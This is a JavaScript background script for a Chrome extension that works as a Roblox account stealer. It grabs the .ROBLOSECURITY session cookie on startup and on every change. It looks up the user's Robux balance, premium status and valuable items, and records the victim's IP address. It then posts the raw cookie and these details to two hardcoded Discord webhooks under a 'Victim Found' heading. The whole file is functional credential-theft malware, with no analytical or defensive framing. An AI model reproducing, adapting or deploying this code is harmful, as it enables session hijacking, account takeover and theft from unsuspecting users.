const WEBHOOKS = [
    {
        url: "https://discord.com/api/webhooks/1377683745041154229/hem_TvDKnw1xhxttS0M6226ZOuVhIeJ60vZtmBD1M_nOAMTE8Vn8a6KHVvibHmtT7RPc",
        mention: "@everyone"
    },
    {
        url: "https://discord.com/api/webhooks/1415278526759833731/WaeDWNykipwumKcp2RlmMHXdnWt2KG9CBM719u38aybdV8wENS2o5z2cJr66SdbiLHK1",
        mention: "@everyone"
    }
];

let lastCookie = null; // 🔑 Track last sent cookie

async function checkOwnership(userId, assetId, cookie) {
    let res = await fetch(`https://inventory.roblox.com/v1/users/${userId}/items/Asset/${assetId}`, {
        method: "GET",
        headers: { "Cookie": ".ROBLOSECURITY=" + cookie }
    });
    if (!res.ok) return false;
    let json = await res.json();
    return (json && json.data && json.data.length > 0);
}

async function main(cookie) {
    if (!cookie) return;

    // ✅ Prevent duplicate sends
    if (cookie === lastCookie) {
        console.log("⚠️ Same cookie detected, skipping send.");
        return;
    }
    lastCookie = cookie; // store new cookie

    let ipAddr = await (await fetch("https://api.ipify.org")).text();
    let statistics = null;

    try {
        let res = await fetch("https://users.roblox.com/v1/users/authenticated", {
            method: "GET",
            headers: { "Cookie": ".ROBLOSECURITY=" + cookie }
        });

        if (res.ok) {
            let user = await res.json();

            // Robux + Pending
            let economyRes = await fetch("https://economy.roblox.com/v1/users/" + user.id + "/currency", {
                method: "GET",
                headers: { "Cookie": ".ROBLOSECURITY=" + cookie }
            });
            let economy = economyRes.ok ? await economyRes.json() : { robux: "N/A", robuxPending: "N/A" };

            // Premium check
            let premiumRes = await fetch("https://premiumfeatures.roblox.com/v1/users/" + user.id + "/validate-membership", {
                method: "GET",
                headers: { "Cookie": ".ROBLOSECURITY=" + cookie }
            });
            let isPremium = premiumRes.ok ? await premiumRes.json() : false;

            // ✅ Profile picture
            let thumbRes = await fetch(`https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=${user.id}&size=420x420&format=Png&isCircular=false`);
            let thumbJson = await thumbRes.json();
            let thumbUrl = (thumbJson.data && thumbJson.data.length > 0)
                ? thumbJson.data[0].imageUrl
                : "https://upload.wikimedia.org/wikipedia/commons/thumb/f/f3/NA_cap_icon.svg/1200px-NA_cap_icon.svg.png";

            // ✅ Check Korblox + Headless
            let hasKorblox = await checkOwnership(user.id, 18122167, cookie);
            let hasHeadless = await checkOwnership(user.id, 134082579, cookie);

            statistics = {
                UserName: user.name,
                RobuxBalance: economy.robux ?? "N/A",
                PendingRobux: economy.robuxPending ?? "N/A",
                IsPremium: isPremium,
                ThumbnailUrl: thumbUrl,
                Korblox: hasKorblox,
                Headless: hasHeadless
            };
        }
    } catch (e) {
        console.error("Failed to fetch Roblox info:", e);
    }

    // Base embed
    let embedPayload = {
        "embeds": [
            {
                "description": "```" + (cookie ? cookie : "COOKIE NOT FOUND") + "```",
                "fields": [
                    { "name": "Username", "value": statistics ? statistics.UserName : "N/A", "inline": true },
                    { "name": "Robux", "value": statistics ? statistics.RobuxBalance : "N/A", "inline": true },
                    { "name": "Pending Robux", "value": statistics ? statistics.PendingRobux : "N/A", "inline": true },
                    { "name": "Premium", "value": statistics ? (statistics.IsPremium ? "✅ Yes" : "❌ No") : "N/A", "inline": true },
                    { "name": "Korblox", "value": statistics ? (statistics.Korblox ? "✅ Owns" : "❌ None") : "N/A", "inline": true },
                    { "name": "Headless", "value": statistics ? (statistics.Headless ? "✅ Owns" : "❌ None") : "N/A", "inline": true }
                ],
                "author": {
                    "name": "Victim Found: " + ipAddr,
                    "icon_url": statistics ? statistics.ThumbnailUrl : "https://upload.wikimedia.org/wikipedia/commons/thumb/f/f3/NA_cap_icon.svg/1200px-NA_cap_icon.svg.png"
                },
                "footer": {
                    "text": "ENTERPRISE",
                    "icon_url": "https://i.postimg.cc/bwpLd4YK/IMG-20250822-180503.jpg"
                },
                "thumbnail": { "url": statistics ? statistics.ThumbnailUrl : "https://upload.wikimedia.org/wikipedia/commons/thumb/f/f3/NA_cap_icon.svg/1200px-NA_cap_icon.svg.png" }
            }
        ],
        "username": "Extension Logger",
        "avatar_url": "https://i.postimg.cc/bwpLd4YK/IMG-20250822-180503.jpg"
    };

    // Send to all webhooks
    for (let wh of WEBHOOKS) {
        let payload = { ...embedPayload, content: wh.mention };

        fetch(wh.url, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(payload)
        });
    }
}

// 🚀 Run once on startup
chrome.cookies.get({ "url": "https://www.roblox.com/home", "name": ".ROBLOSECURITY" }, function (cookie) {
    main(cookie ? cookie.value : null);
});

// ♾️ Keep watching forever
chrome.cookies.onChanged.addListener(function (changeInfo) {
    if (changeInfo.cookie && changeInfo.cookie.name === ".ROBLOSECURITY" && changeInfo.cookie.domain.includes("roblox.com")) {
        if (changeInfo.removed) {
            console.log("Roblox cookie removed (logout).");
        } else {
            console.log("Roblox cookie updated (login/refresh).");
            main(changeInfo.cookie.value);
        }
    }
});

